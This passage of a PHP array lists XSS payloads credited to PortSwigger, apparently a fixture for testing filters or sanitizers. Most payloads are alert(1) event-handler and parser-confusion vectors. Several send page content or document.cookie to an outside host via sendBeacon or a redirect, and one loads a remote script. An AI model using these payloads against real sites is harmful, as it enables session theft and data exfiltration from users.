                'payload' => '<xss onsecuritypolicyviolation=alert(1)>XSS</xss>',
                'attribution' => 'PortSwigger',
                'url_shaped' => false,
            ],
            'portswigger-170' => [
                'payload' => 'x<template shadowrootmode=open><slot onslotchange=alert(1)>',
                'attribution' => 'PortSwigger',
                'url_shaped' => false,
            ],
            'portswigger-171' => [
                'payload' => '<audio controls onsuspend=alert(1)><source src=validaudio.mp3 type=audio/mpeg></audio>',
                'attribution' => 'PortSwigger',
                'url_shaped' => true,
            ],
            'portswigger-172' => [
                'payload' => '<audio controls autoplay ontimeupdate=alert(1)><source src="validaudio.wav" type="audio/wav"></audio>',
                'attribution' => 'PortSwigger',
                'url_shaped' => true,
            ],
            'portswigger-173' => [
                'payload' => '<details ontoggle=alert(1) open>test</details>',
                'attribution' => 'PortSwigger',
                'url_shaped' => false,
            ],
            'portswigger-174' => [
                'payload' => '<style>:target {color: red;}</style><xss id=x style="transition:color 10s" ontransitioncancel=print()></xss>',
                'attribution' => 'PortSwigger',
                'url_shaped' => false,
            ],
            'portswigger-175' => [
                'payload' => '<xss autofocus style=transition:1s ontransitionend=alert(1) tabindex=1>',
                'attribution' => 'PortSwigger',
                'url_shaped' => false,
            ],
            'portswigger-176' => [
                'payload' => '<style>:target {transform: rotate(180deg);}</style><xss id=x style="transition:transform 2s" ontransitionrun=print()></xss>',
                'attribution' => 'PortSwigger',
                'url_shaped' => false,
            ],
            'portswigger-177' => [
                'payload' => '<style>:target {color:red;}</style><xss id=x style="transition:color 1s" ontransitionstart=alert(1)></xss>',
                'attribution' => 'PortSwigger',
                'url_shaped' => false,
            ],
            'portswigger-178' => [
                'payload' => '<body onunhandledrejection=alert(1)><script>fetch(\'//xyz\')</script>',
                'attribution' => 'PortSwigger',
                'url_shaped' => false,
            ],
            'portswigger-179' => [
                'payload' => '<body onunload=navigator.sendBeacon(\'//ssl.portswigger-labs.net/\',document.body.innerHTML)>',
                'attribution' => 'PortSwigger',
                'url_shaped' => false,
            ],
            'portswigger-180' => [
                'payload' => '<camera onvalidationstatuschange=alert(1)>',
                'attribution' => 'PortSwigger',
                'url_shaped' => false,
            ],
            'portswigger-181' => [
                'payload' => '<audio controls loop muted autoplay onwaiting=alert(1)><source src=validaudio.mp3 type=audio/mpeg></audio>',
                'attribution' => 'PortSwigger',
                'url_shaped' => true,
            ],
            'portswigger-182' => [
                'payload' => '<style>@keyframes x{}</style><xss style="animation-name:x" onwebkitanimationend="alert(1)"></xss>',
                'attribution' => 'PortSwigger',
                'url_shaped' => false,
            ],
            'portswigger-183' => [
                'payload' => '<style>@keyframes slidein {}</style><xss style="animation-duration:1s;animation-name:slidein;animation-iteration-count:2" onwebkitanimationiteration="alert(1)"></xss>',
                'attribution' => 'PortSwigger',
                'url_shaped' => false,
            ],
            'portswigger-184' => [
                'payload' => '<style>@keyframes x{}</style><xss style="animation-name:x" onwebkitanimationstart="alert(1)"></xss>',
                'attribution' => 'PortSwigger',
                'url_shaped' => false,
            ],
            'portswigger-185' => [
                'payload' => '<audio src=data:,%23EXTM3U%0A%23EXT-X-TARGETDURATION:1%0A%23EXT-X-KEY:METHOD=AES-128,URI=%22skd:%22%0A%23EXTINF:1%0Ax onwebkitneedkey=alert(1)></audio>',
                'attribution' => 'PortSwigger',
                'url_shaped' => true,
            ],
            'portswigger-186' => [
                'payload' => '<audio onwebkitplaybacktargetavailabilitychanged=alert(1)>',
                'attribution' => 'PortSwigger',
                'url_shaped' => false,
            ],
            'portswigger-187' => [
                'payload' => '<xss style=transition:1s onwebkittransitionend=alert(1) tabindex=1 autofocus>',
                'attribution' => 'PortSwigger',
                'url_shaped' => false,
            ],
            'portswigger-188' => [
                'payload' => '<body onafterprint=alert(1)>',
                'attribution' => 'PortSwigger',
                'url_shaped' => false,
            ],
            'portswigger-189' => [
                'payload' => '<input onauxclick=alert(1)>',
                'attribution' => 'PortSwigger',
                'url_shaped' => false,
            ],
            'portswigger-190' => [
                'payload' => '<a onbeforecopy="alert(1)" contenteditable>test</a>',
                'attribution' => 'PortSwigger',
                'url_shaped' => false,
            ],
            'portswigger-191' => [
                'payload' => '<a onbeforecut="alert(1)" contenteditable>test</a>',
                'attribution' => 'PortSwigger',
                'url_shaped' => false,
            ],
            'portswigger-192' => [
                'payload' => '<xss contenteditable onbeforeinput=alert(1)>test',
                'attribution' => 'PortSwigger',
                'url_shaped' => false,
            ],
            'portswigger-193' => [
                'payload' => '<xss onbeforepaste=alert(1)>XSS</xss>',
                'attribution' => 'PortSwigger',
                'url_shaped' => false,
            ],
            'portswigger-194' => [
                'payload' => '<button popovertarget=x>Click me</button><xss onbeforetoggle=alert(1) popover id=x>XSS</xss>',
                'attribution' => 'PortSwigger',
                'url_shaped' => false,
            ],
            'portswigger-195' => [
                'payload' => '<xss onblur=alert(1) id=x tabindex=1 style=display:block>test</xss><input value=clickme>',
                'attribution' => 'PortSwigger',
                'url_shaped' => false,
            ],
            'portswigger-196' => [
                'payload' => '<input type=file oncancel=alert(1)>',
                'attribution' => 'PortSwigger',
                'url_shaped' => false,
            ],
            'portswigger-197' => [
                'payload' => '<input onchange=alert(1) value=xss>',
                'attribution' => 'PortSwigger',
                'url_shaped' => false,
            ],
            'portswigger-198' => [
                'payload' => '<xss onclick="alert(1)" style=display:block>test</xss>',
                'attribution' => 'PortSwigger',
                'url_shaped' => false,
            ],
            'portswigger-199' => [
                'payload' => '<dialog open onclose=alert(1)><form method=dialog><button>XSS</button></form>',
                'attribution' => 'PortSwigger',
                'url_shaped' => false,
            ],
            'portswigger-200' => [
                'payload' => '<button commandfor=test command=show-popover>Click<div id=test oncommand=alert(1)>',
                'attribution' => 'PortSwigger',
                'url_shaped' => false,
            ],
            'portswigger-201' => [
                'payload' => '<xss oncontextmenu="alert(1)" style=display:block>test</xss>',
                'attribution' => 'PortSwigger',
                'url_shaped' => false,
            ],
            'portswigger-202' => [
                'payload' => '<xss oncopy=alert(1) value="XSS" autofocus tabindex=1 style=display:block>test',
                'attribution' => 'PortSwigger',
                'url_shaped' => false,
            ],
            'portswigger-203' => [
                'payload' => '<xss oncut=alert(1) value="XSS" autofocus tabindex=1 style=display:block>test',
                'attribution' => 'PortSwigger',
                'url_shaped' => false,
            ],
            'portswigger-204' => [
                'payload' => '<xss ondblclick="alert(1)" autofocus tabindex=1 style=display:block>test</xss>',
                'attribution' => 'PortSwigger',
                'url_shaped' => false,
            ],
            'portswigger-205' => [
                'payload' => '<xss draggable="true" ondrag="alert(1)" style=display:block>test</xss>',
                'attribution' => 'PortSwigger',
                'url_shaped' => false,
            ],
            'portswigger-206' => [
                'payload' => '<xss draggable="true" ondragend="alert(1)" style=display:block>test</xss>',
                'attribution' => 'PortSwigger',
                'url_shaped' => false,
            ],
            'portswigger-207' => [
                'payload' => '<xss draggable="true" ondragenter="alert(1)" style=display:block>test</xss>',
                'attribution' => 'PortSwigger',
                'url_shaped' => false,
            ],
            'portswigger-208' => [
                'payload' => '<xss draggable="true" ondragexit="alert(1)" style=display:block>test</xss>',
                'attribution' => 'PortSwigger',
                'url_shaped' => false,
            ],
            'portswigger-209' => [
                'payload' => '<xss draggable="true" ondragleave="alert(1)" style=display:block>test</xss>',
                'attribution' => 'PortSwigger',
                'url_shaped' => false,
            ],
            'portswigger-210' => [
                'payload' => '<div draggable="true" contenteditable>drag me</div><xss ondragover=alert(1) contenteditable style=display:block>drop here</xss>',
                'attribution' => 'PortSwigger',
                'url_shaped' => false,
            ],
            'portswigger-211' => [
                'payload' => '<xss draggable="true" ondragstart="alert(1)" style=display:block>test</xss>',
                'attribution' => 'PortSwigger',
                'url_shaped' => false,
            ],
            'portswigger-212' => [
                'payload' => '<div draggable="true" contenteditable>drag me</div><xss ondrop=alert(1) contenteditable style=display:block>drop here</xss>',
                'attribution' => 'PortSwigger',
                'url_shaped' => false,
            ],
            'portswigger-213' => [
                'payload' => '<xss onfocusout=alert(1) autofocus tabindex=1 style=display:block>test</xss><input value=clickme>',
                'attribution' => 'PortSwigger',
                'url_shaped' => false,
            ],
            'portswigger-214' => [
                'payload' => '<form onformdata="alert(1)"><button>Click</button></form>',
                'attribution' => 'PortSwigger',
                'url_shaped' => false,
            ],
            'portswigger-215' => [
                'payload' => '<video onfullscreenchange=alert(1) src=validvideo.mp4 controls>',
                'attribution' => 'PortSwigger',
                'url_shaped' => true,
            ],
            'portswigger-216' => [
                'payload' => '<div ongesturechange=alert(1)>XSS</div>',
                'attribution' => 'PortSwigger',
                'url_shaped' => false,
            ],
            'portswigger-217' => [
                'payload' => '<div ongestureend=alert(1)>XSS</div>',
                'attribution' => 'PortSwigger',
                'url_shaped' => false,
            ],
            'portswigger-218' => [
                'payload' => '<div ongesturestart=alert(1)>XSS</div>',
                'attribution' => 'PortSwigger',
                'url_shaped' => false,
            ],
            'portswigger-219' => [
                'payload' => '<input type=range ongotpointercapture=alert(1)>',
                'attribution' => 'PortSwigger',
                'url_shaped' => false,
            ],
            'portswigger-220' => [
                'payload' => '<input oninput=alert(1) value=xss>',
                'attribution' => 'PortSwigger',
                'url_shaped' => false,
            ],
            'portswigger-221' => [
                'payload' => '<form><input oninvalid=alert(1) required><input type=submit>',
                'attribution' => 'PortSwigger',
                'url_shaped' => false,
            ],
            'portswigger-222' => [
                'payload' => '<xss onkeydown="alert(1)" contenteditable style=display:block>test</xss>',
                'attribution' => 'PortSwigger',
                'url_shaped' => false,
            ],
            'portswigger-223' => [
                'payload' => '<xss onkeypress="alert(1)" contenteditable style=display:block>test</xss>',
                'attribution' => 'PortSwigger',
                'url_shaped' => false,
            ],
            'portswigger-224' => [
                'payload' => '<xss onkeyup="alert(1)" contenteditable style=display:block>test</xss>',
                'attribution' => 'PortSwigger',
                'url_shaped' => false,
            ],
            'portswigger-225' => [
                'payload' => '<geolocation autolocate onlocation=alert(1)>',
                'attribution' => 'PortSwigger',
                'url_shaped' => false,
            ],
            'portswigger-226' => [
                'payload' => '<input type=range onlostpointercapture=alert(1)>',
                'attribution' => 'PortSwigger',
                'url_shaped' => false,
            ],
            'portswigger-227' => [
                'payload' => '<xss onmousedown="alert(1)" style=display:block>test</xss>',
                'attribution' => 'PortSwigger',
                'url_shaped' => false,
            ],
            'portswigger-228' => [
                'payload' => '<xss onmouseenter="alert(1)" style=display:block>test</xss>',
                'attribution' => 'PortSwigger',
                'url_shaped' => false,
            ],
            'portswigger-229' => [
                'payload' => '<xss onmouseleave="alert(1)" style=display:block>test</xss>',
                'attribution' => 'PortSwigger',
                'url_shaped' => false,
            ],
            'portswigger-230' => [
                'payload' => '<xss onmousemove="alert(1)" style=display:block>test</xss>',
                'attribution' => 'PortSwigger',
                'url_shaped' => false,
            ],
            'portswigger-231' => [
                'payload' => '<xss onmouseout="alert(1)" style=display:block>test</xss>',
                'attribution' => 'PortSwigger',
                'url_shaped' => false,
            ],
            'portswigger-232' => [
                'payload' => '<xss onmouseover="alert(1)" style=display:block>test</xss>',
                'attribution' => 'PortSwigger',
                'url_shaped' => false,
            ],
            'portswigger-233' => [
                'payload' => '<xss onmouseup="alert(1)" style=display:block>test</xss>',
                'attribution' => 'PortSwigger',
                'url_shaped' => false,
            ],
            'portswigger-234' => [
                'payload' => '<xss onmousewheel=alert(1) style=display:block>requires scrolling',
                'attribution' => 'PortSwigger',
                'url_shaped' => false,
            ],
            'portswigger-235' => [
                'payload' => '<video onmozfullscreenchange=alert(1) src=validvideo.mp4 controls>',
                'attribution' => 'PortSwigger',
                'url_shaped' => true,
            ],
            'portswigger-236' => [
                'payload' => '<body onpagehide=navigator.sendBeacon(\'//ssl.portswigger-labs.net/\',document.body.innerHTML)>',
                'attribution' => 'PortSwigger',
                'url_shaped' => false,
            ],
            'portswigger-237' => [
                'payload' => '<body onpageswap=navigator.sendBeacon(\'//ssl.portswigger-labs.net/\',document.body.innerHTML)>',
                'attribution' => 'PortSwigger',
                'url_shaped' => false,
            ],
            'portswigger-238' => [
                'payload' => '<a onpaste="alert(1)" contenteditable>test</a>',
                'attribution' => 'PortSwigger',
                'url_shaped' => false,
            ],
            'portswigger-239' => [
                'payload' => '<audio autoplay controls onpause=alert(1)><source src="validaudio.wav" type="audio/wav"></audio>',
                'attribution' => 'PortSwigger',
                'url_shaped' => true,
            ],
            'portswigger-240' => [
                'payload' => '<xss onpointercancel=alert(1)>XSS</xss>',
                'attribution' => 'PortSwigger',
                'url_shaped' => false,
            ],
            'portswigger-241' => [
                'payload' => '<xss onpointerdown=alert(1) style=display:block>XSS</xss>',
                'attribution' => 'PortSwigger',
                'url_shaped' => false,
            ],
            'portswigger-242' => [
                'payload' => '<xss onpointerenter=alert(1) style=display:block>XSS</xss>',
                'attribution' => 'PortSwigger',
                'url_shaped' => false,
            ],
            'portswigger-243' => [
                'payload' => '<xss onpointerleave=alert(1) style=display:block>XSS</xss>',
                'attribution' => 'PortSwigger',
                'url_shaped' => false,
            ],
            'portswigger-244' => [
                'payload' => '<xss onpointermove=alert(1) style=display:block>XSS</xss>',
                'attribution' => 'PortSwigger',
                'url_shaped' => false,
            ],
            'portswigger-245' => [
                'payload' => '<xss onpointerout=alert(1) style=display:block>XSS</xss>',
                'attribution' => 'PortSwigger',
                'url_shaped' => false,
            ],
            'portswigger-246' => [
                'payload' => '<xss onpointerover=alert(1) style=display:block>XSS</xss>',
                'attribution' => 'PortSwigger',
                'url_shaped' => false,
            ],
            'portswigger-247' => [
                'payload' => '<xss onpointerrawupdate=alert(1) style=display:block>XSS</xss>',
                'attribution' => 'PortSwigger',
                'url_shaped' => false,
            ],
            'portswigger-248' => [
                'payload' => '<xss onpointerup=alert(1) style=display:block>XSS</xss>',
                'attribution' => 'PortSwigger',
                'url_shaped' => false,
            ],
            'portswigger-249' => [
                'payload' => '<geolocation onpromptaction=alert(1)>',
                'attribution' => 'PortSwigger',
                'url_shaped' => false,
            ],
            'portswigger-250' => [
                'payload' => '<geolocation onpromptdismiss=alert(1)>',
                'attribution' => 'PortSwigger',
                'url_shaped' => false,
            ],
            'portswigger-251' => [
                'payload' => '<audio controls autoplay onratechange=alert(1)><source src="validaudio.wav" type="audio/wav"></audio>',
                'attribution' => 'PortSwigger',
                'url_shaped' => true,
            ],
            'portswigger-252' => [
                'payload' => '<form onreset=alert(1)><input type=reset>',
                'attribution' => 'PortSwigger',
                'url_shaped' => false,
            ],
            'portswigger-253' => [
                'payload' => '<form><input type=search onsearch=alert(1) value="Hit return" autofocus>',
                'attribution' => 'PortSwigger',
                'url_shaped' => false,
            ],
            'portswigger-254' => [
                'payload' => '<audio autoplay controls onseeked=alert(1)><source src="validaudio.wav" type="audio/wav"></audio>',
                'attribution' => 'PortSwigger',
                'url_shaped' => true,
            ],
            'portswigger-255' => [
                'payload' => '<audio autoplay controls onseeking=alert(1)><source src="validaudio.wav" type="audio/wav"></audio>',
                'attribution' => 'PortSwigger',
                'url_shaped' => true,
            ],
            'portswigger-256' => [
                'payload' => '<input onselect=alert(1) value="XSS" autofocus>',
                'attribution' => 'PortSwigger',
                'url_shaped' => false,
            ],
            'portswigger-257' => [
                'payload' => '<body onselectionchange=alert(1)>select some text',
                'attribution' => 'PortSwigger',
                'url_shaped' => false,
            ],
            'portswigger-258' => [
                'payload' => '<body onselectstart=alert(1)>select some text',
                'attribution' => 'PortSwigger',
                'url_shaped' => false,
            ],
            'portswigger-259' => [
                'payload' => '<usermedia onstream=alert(1)>',
                'attribution' => 'PortSwigger',
                'url_shaped' => false,
            ],
            'portswigger-260' => [
                'payload' => '<form onsubmit=alert(1)><input type=submit>',
                'attribution' => 'PortSwigger',
                'url_shaped' => false,
            ],
            'portswigger-261' => [
                'payload' => '<button popovertarget=x>Click me</button><xss ontoggle=alert(1) popover id=x>XSS</xss>',
                'attribution' => 'PortSwigger',
                'url_shaped' => false,
            ],
            'portswigger-262' => [
                'payload' => '<xss ontouchcancel=alert(1)>XSS</xss>',
                'attribution' => 'PortSwigger',
                'url_shaped' => false,
            ],
            'portswigger-263' => [
                'payload' => '<body ontouchend=alert(1)>',
                'attribution' => 'PortSwigger',
                'url_shaped' => false,
            ],
            'portswigger-264' => [
                'payload' => '<body ontouchmove=alert(1)>',
                'attribution' => 'PortSwigger',
                'url_shaped' => false,
            ],
            'portswigger-265' => [
                'payload' => '<body ontouchstart=alert(1)>',
                'attribution' => 'PortSwigger',
                'url_shaped' => false,
            ],
            'portswigger-266' => [
                'payload' => '<audio autoplay controls onvolumechange=alert(1)><source src="validaudio.wav" type="audio/wav"></audio>',
                'attribution' => 'PortSwigger',
                'url_shaped' => true,
            ],
            'portswigger-267' => [
                'payload' => '<audio controls onwaiting=alert(1)><source src=x type=x></audio>',
                'attribution' => 'PortSwigger',
                'url_shaped' => true,
            ],
            'portswigger-268' => [
                'payload' => '<video controls src=validvideo.mp4 onwebkitfullscreenchange=alert(1)>',
                'attribution' => 'PortSwigger',
                'url_shaped' => true,
            ],
            'portswigger-269' => [
                'payload' => '<xss onwebkitmouseforcechanged=alert(1)>XSS</xss>',
                'attribution' => 'PortSwigger',
                'url_shaped' => false,
            ],
            'portswigger-270' => [
                'payload' => '<xss onwebkitmouseforcedown=alert(1)>XSS</xss>',
                'attribution' => 'PortSwigger',
                'url_shaped' => false,
            ],
            'portswigger-271' => [
                'payload' => '<xss onwebkitmouseforceup=alert(1)>XSS</xss>',
                'attribution' => 'PortSwigger',
                'url_shaped' => false,
            ],
            'portswigger-272' => [
                'payload' => '<xss onwebkitmouseforcewillbegin=alert(1)>XSS</xss>',
                'attribution' => 'PortSwigger',
                'url_shaped' => false,
            ],
            'portswigger-273' => [
                'payload' => '<video controls src=validvideo.mp4 onwebkitpresentationmodechanged=alert(1)>',
                'attribution' => 'PortSwigger',
                'url_shaped' => true,
            ],
            'portswigger-274' => [
                'payload' => '<xss onwebkitwillrevealbottom=alert(1)>XSS</xss>',
                'attribution' => 'PortSwigger',
                'url_shaped' => false,
            ],
            'portswigger-275' => [
                'payload' => '<body onwheel=alert(1)>',
                'attribution' => 'PortSwigger',
                'url_shaped' => false,
            ],
            'portswigger-276' => [
                'payload' => '<math><textarea><img src onerror=alert(1)></textarea></math>',
                'attribution' => 'PortSwigger',
                'url_shaped' => true,
            ],
            'portswigger-277' => [
                'payload' => '<math><textarea><embed src=1 onerror=alert(1) type=image/gif></textarea></math>',
                'attribution' => 'PortSwigger',
                'url_shaped' => true,
            ],
            'portswigger-278' => [
                'payload' => '<math><textarea><body onload=alert(1)></textarea></math>',
                'attribution' => 'PortSwigger',
                'url_shaped' => false,
            ],
            'portswigger-279' => [
                'payload' => '<math><noscript><img src onerror=alert(1)></noscript></math>',
                'attribution' => 'PortSwigger',
                'url_shaped' => true,
            ],
            'portswigger-280' => [
                'payload' => '<math><noscript><embed src=1 onerror=alert(1) type=image/gif></noscript></math>',
                'attribution' => 'PortSwigger',
                'url_shaped' => true,
            ],
            'portswigger-281' => [
                'payload' => '<math><noscript><body onload=alert(1)></noscript></math>',
                'attribution' => 'PortSwigger',
                'url_shaped' => false,
            ],
            'portswigger-282' => [
                'payload' => '<math><title><img src onerror=alert(1)></title></math>',
                'attribution' => 'PortSwigger',
                'url_shaped' => true,
            ],
            'portswigger-283' => [
                'payload' => '<math><title><embed src=1 onerror=alert(1) type=image/gif></title></math>',
                'attribution' => 'PortSwigger',
                'url_shaped' => true,
            ],
            'portswigger-284' => [
                'payload' => '<math><title><body onload=alert(1)></title></math>',
                'attribution' => 'PortSwigger',
                'url_shaped' => false,
            ],
            'portswigger-285' => [
                'payload' => '<noembed><img title="</noembed><img src onerror=alert(1)>"></noembed>',
                'attribution' => 'PortSwigger',
                'url_shaped' => true,
            ],
            'portswigger-286' => [
                'payload' => '<noscript><img title="</noscript><img src onerror=alert(1)>"></noscript>',
                'attribution' => 'PortSwigger',
                'url_shaped' => true,
            ],
            'portswigger-287' => [
                'payload' => '<style><img title="</style><img src onerror=alert(1)>"></style>',
                'attribution' => 'PortSwigger',
                'url_shaped' => true,
            ],
            'portswigger-288' => [
                'payload' => '<script><img title="</script><img src onerror=alert(1)>"></script>',
                'attribution' => 'PortSwigger',
                'url_shaped' => true,
            ],
            'portswigger-289' => [
                'payload' => '<iframe><img title="</iframe><img src onerror=alert(1)>"></iframe>',
                'attribution' => 'PortSwigger',
                'url_shaped' => true,
            ],
            'portswigger-290' => [
                'payload' => '<xmp><img title="</xmp><img src onerror=alert(1)>"></xmp>',
                'attribution' => 'PortSwigger',
                'url_shaped' => true,
            ],
            'portswigger-291' => [
                'payload' => '<textarea><img title="</textarea><img src onerror=alert(1)>"></textarea>',
                'attribution' => 'PortSwigger',
                'url_shaped' => true,
            ],
            'portswigger-292' => [
                'payload' => '<noframes><img title="</noframes><img src onerror=alert(1)>"></noframes>',
                'attribution' => 'PortSwigger',
                'url_shaped' => true,
            ],
            'portswigger-293' => [
                'payload' => '<title><img title="</title><img src onerror=alert(1)>"></title>',
                'attribution' => 'PortSwigger',
                'url_shaped' => true,
            ],
            'portswigger-294' => [
                'payload' => '<select><noscript></select><img src onerror=alert(1)></noscript></select>',
                'attribution' => 'PortSwigger',
                'url_shaped' => true,
            ],
            'portswigger-295' => [
                'payload' => '<select><title></select><img src onerror=alert(1)></title></select>',
                'attribution' => 'PortSwigger',
                'url_shaped' => true,
            ],
            'portswigger-296' => [
                'payload' => '<select><style></select><img src onerror=alert(1)></style></select>',
                'attribution' => 'PortSwigger',
                'url_shaped' => true,
            ],
            'portswigger-297' => [
                'payload' => '<select><noembed></select><img src onerror=alert(1)></noembed></select>',
                'attribution' => 'PortSwigger',
                'url_shaped' => true,
            ],
            'portswigger-298' => [
                'payload' => '<select><xmp></select><img src onerror=alert(1)></xmp></select>',
                'attribution' => 'PortSwigger',
                'url_shaped' => true,
            ],
            'portswigger-299' => [
                'payload' => '<select><noframes></select><img src onerror=alert(1)></noframes></select>',
                'attribution' => 'PortSwigger',
                'url_shaped' => true,
            ],
            'portswigger-300' => [
                'payload' => '<script>eval(myUndefVar);var inject="INJECTION_STARTS_HERE";var myUndefVar;alert(1);//";</script>',
                'attribution' => 'PortSwigger',
                'url_shaped' => false,
            ],
            'portswigger-301' => [
                'payload' => '<script>myUndefFunction(13,37);var inject="INJECTION_STARTS_HERE";function myUndefFunction(){};alert(1);//";</script>',
                'attribution' => 'PortSwigger',
                'url_shaped' => false,
            ],
            'portswigger-302' => [
                'payload' => '<script>var myUndefObject = new myUndefClass();var inject="INJECTION_STARTS_HERE";function myUndefClass(){};alert(1);//";</script>',
                'attribution' => 'PortSwigger',
                'url_shaped' => false,
            ],
            'portswigger-303' => [
                'payload' => '<script>$(document).ready(function(){var inject="INJECTION_STARTS_HERE";});function $(){return{ready:()=>0}};alert(1);(function(){"";});</script>',
                'attribution' => 'PortSwigger',
                'url_shaped' => false,
            ],
            'portswigger-304' => [
                'payload' => '<script>undef01.undef02("INJECTION"+alert(1));function undef01(){}//");</script>',
                'attribution' => 'PortSwigger',
                'url_shaped' => false,
            ],
            'portswigger-305' => [
                'payload' => '<script>undef01[\'undef02\',\'INJECTION\'+alert(1)];function undef01(){};//\'];</script>',
                'attribution' => 'PortSwigger',
                'url_shaped' => false,
            ],
            'portswigger-306' => [
                'payload' => '<script type="module">undef01.undef02.undef03.undef04.undef05();var inject = "INJECTION";import "data:text/jscript,alert(1)"//";</script>',
                'attribution' => 'PortSwigger',
                'url_shaped' => true,
            ],
            'portswigger-307' => [
                'payload' => '<script>var x=atob("dXNlbGVzcyBjYWxsIG9mIG5hdGl2ZSBmdW5jdGlvbiAh");undef01.undef02();var inject = "INJECTION";function atob(){alert(1);}//";</script>',
                'attribution' => 'PortSwigger',
                'url_shaped' => false,
            ],
            'portswigger-308' => [
                'payload' => '<script>onerror=alert;throw 1</script>',
                'attribution' => 'PortSwigger',
                'url_shaped' => false,
            ],
            'portswigger-309' => [
                'payload' => '<script>{onerror=alert}throw 1</script>',
                'attribution' => 'PortSwigger',
                'url_shaped' => false,
            ],
            'portswigger-310' => [
                'payload' => '<script>throw onerror=alert,1</script>',
                'attribution' => 'PortSwigger',
                'url_shaped' => false,
            ],
            'portswigger-311' => [
                'payload' => '<script>throw onerror=eval,\'=alert\\x281\\x29\'</script>',
                'attribution' => 'PortSwigger',
                'url_shaped' => false,
            ],
            'portswigger-312' => [
                'payload' => '<script>throw onerror=eval,\'alert\\x281\\x29\'</script>',
                'attribution' => 'PortSwigger',
                'url_shaped' => false,
            ],
            'portswigger-313' => [
                'payload' => '<script>{onerror=eval}throw{lineNumber:1,columnNumber:1,fileName:1,message:\'alert\\x281\\x29\'}</script>',
                'attribution' => 'PortSwigger',
                'url_shaped' => false,
            ],
            'portswigger-314' => [
                'payload' => '<script>throw onerror=eval,e=new Error,e.message=\'alert\\x281\\x29\',e</script>',
                'attribution' => 'PortSwigger',
                'url_shaped' => false,
            ],
            'portswigger-315' => [
                'payload' => '<script>throw onerror=Uncaught=eval,e=new Error,e.message=\'/*\'+location.hash,!!window.InstallTrigger?e:e.message</script>',
                'attribution' => 'PortSwigger',
                'url_shaped' => false,
            ],
            'portswigger-316' => [
                'payload' => '<script>throw{},onerror=Uncaught=eval,h=location.hash,e={lineNumber:1,columnNumber:1,fileName:0,message:h[2]+h[1]+h},!!window.InstallTrigger?e:e.message</script>',
                'attribution' => 'PortSwigger',
                'url_shaped' => false,
            ],
            'portswigger-317' => [
                'payload' => '<script>throw/x/,onerror=Uncaught=eval,h=location.hash,e=Error,e.lineNumber=e.columnNumber=e.fileName=e.message=h[2]+h[1]+h,!!window.InstallTrigger?e:e.message</script>',
                'attribution' => 'PortSwigger',
                'url_shaped' => false,
            ],
            'portswigger-318' => [
                'payload' => '<script>\'alert\\x281\\x29\'instanceof{[Symbol.hasInstance]:eval}</script>',
                'attribution' => 'PortSwigger',
                'url_shaped' => false,
            ],
            'portswigger-319' => [
                'payload' => '<script>\'alert\\x281\\x29\'instanceof{[Symbol[\'hasInstance\']]:eval}</script>',
                'attribution' => 'PortSwigger',
                'url_shaped' => false,
            ],
            'portswigger-320' => [
                'payload' => '<script>location=\'javascript:alert\\x281\\x29\'</script>',
                'attribution' => 'PortSwigger',
                'url_shaped' => true,
            ],
            'portswigger-321' => [
                'payload' => '<script>window.name=\'alert(1)\';</script><script>location=name</script>',
                'attribution' => 'PortSwigger',
                'url_shaped' => false,
            ],
            'portswigger-322' => [
                'payload' => '<script>alert`1`</script>',
                'attribution' => 'PortSwigger',
                'url_shaped' => false,
            ],
            'portswigger-323' => [
                'payload' => '<script>new Function`X${document.location.hash.substr`1`}`</script>',
                'attribution' => 'PortSwigger',
                'url_shaped' => false,
            ],
            'portswigger-324' => [
                'payload' => '<script>Function`X${document.location.hash.substr`1`}```</script>',
                'attribution' => 'PortSwigger',
                'url_shaped' => false,
            ],
            'portswigger-325' => [
                'payload' => '<video><source onerror=location=/\\02.rs/+document.cookie>',
                'attribution' => 'PortSwigger',
                'url_shaped' => false,
            ],
            'portswigger-326' => [
                'payload' => '<svg onload=alert(1)',
                'attribution' => 'PortSwigger',
                'url_shaped' => false,
            ],
            'portswigger-327' => [
                'payload' => '<svg onload=alert(1)<!--',
                'attribution' => 'PortSwigger',
                'url_shaped' => false,
            ],
            'portswigger-328' => [
                'payload' => '<script>throw[onerror]=[alert],1</script>',
                'attribution' => 'PortSwigger',
                'url_shaped' => false,
            ],
            'portswigger-329' => [
                'payload' => '<script>var{a:onerror}={a:alert};throw 1</script>',
                'attribution' => 'PortSwigger',
                'url_shaped' => false,
            ],
            'portswigger-330' => [
                'payload' => '<script>var{haha:onerror=alert}=0;throw 1</script>',
                'attribution' => 'PortSwigger',
                'url_shaped' => false,
            ],
            'portswigger-331' => [
                'payload' => '<script>window.name=\'javascript:alert(1)\';</script><svg onload=location=name>',
                'attribution' => 'PortSwigger',
                'url_shaped' => true,
            ],
            'portswigger-332' => [
                'payload' => '<script>window.name=\'javascript:alert(1)\';function blah(){}',
                'attribution' => 'PortSwigger',
                'url_shaped' => true,
            ],
            'portswigger-333' => [
                'payload' => 'blah(""+{a:location=name}+"")</script>',
                'attribution' => 'PortSwigger',
                'url_shaped' => false,
            ],
            'portswigger-334' => [
                'payload' => 'blah(""+new class b{toString=e=>location=name}+"")</script>',
                'attribution' => 'PortSwigger',
                'url_shaped' => false,
            ],
            'portswigger-335' => [
                'payload' => '<SCRIPT SRC=HTTPS://PORTSWIGGER-LABS.NET/A.JS></SCRIPT>',
                'attribution' => 'PortSwigger',
                'url_shaped' => true,
            ],
            'portswigger-336' => [
                'payload' => '<script>throw onerror=eval,name</script>',
                'attribution' => 'PortSwigger',
                'url_shaped' => false,
            ],
            'portswigger-337' => [
                'payload' => '<script>throw onerror=eval,\'/*\'+location</script>',
                'attribution' => 'PortSwigger',
                'url_shaped' => false,
            ],
            'portswigger-338' => [
                'payload' => '<svg onload="throw top.onerror=eval,\'/*\'+URL">',
                'attribution' => 'PortSwigger',
                'url_shaped' => false,
            ],
            'portswigger-339' => [
                'payload' => '<body onload="throw onerror=eval,\'/*\'+location">',
                'attribution' => 'PortSwigger',
                'url_shaped' => false,
            ],
            'portswigger-340' => [
                'payload' => '<script>ondevicemotion=setTimeout;Event.prototype.toString=URIError.prototype.toString;Event.prototype.message=\'alert\\x281\\x29\'</script>',
                'attribution' => 'PortSwigger',
                'url_shaped' => false,
            ],
            'portswigger-341' => [
                'payload' => '<script>ondeviceorientation=setTimeout;Event.prototype.toString=Error.prototype.toString;Event.prototype.name=\'alert\\x281\\x29\'</script>',
                'attribution' => 'PortSwigger',
                'url_shaped' => false,
            ],
            'portswigger-342' => [
                'payload' => '<script>ondeviceorientationabsolute=setTimeout;Event.prototype.toString=WebTransportError.prototype.toString;Event.prototype.name=\'alert\\x281\\x29\'</script>',
                'attribution' => 'PortSwigger',
                'url_shaped' => false,
            ],
